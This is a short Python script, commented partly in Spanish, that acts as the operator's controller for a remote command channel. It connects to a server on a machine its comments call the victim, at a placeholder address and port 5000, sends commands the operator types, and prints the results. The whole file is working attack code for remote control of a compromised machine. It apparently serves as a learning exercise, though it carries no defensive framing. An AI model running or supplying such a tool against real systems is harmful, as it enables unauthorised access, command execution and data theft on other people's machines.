from socket import socket

# Address and port of the server (Always from the victim machine)
server_address = ('XXX.XXX.XXX.XXX', 5000)

# Create the client socket, since we reestablish the connection to each command that is executed
client_socket = socket()
client_socket.connect(server_address)
estado = True

while estado:

    # Ask the user to enter a command
    comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")

    # If the user enters "exit", close the connection and exit the loop
    if comando_enviar == 'exit':

        # Tell the server that we close the connection:
        client_socket.send(comando_enviar.encode())

        # Close the socket, which will be reopened at the beginning of the loop
        client_socket.close()
        estado = False

    else:

        # Send the command to the victim machine
        client_socket.send(comando_enviar.encode())

        # Wait to receive the response from the victim and save it in the response variable
        respuesta = client_socket.recv(4096)

        # Print the response
        print(respuesta.decode())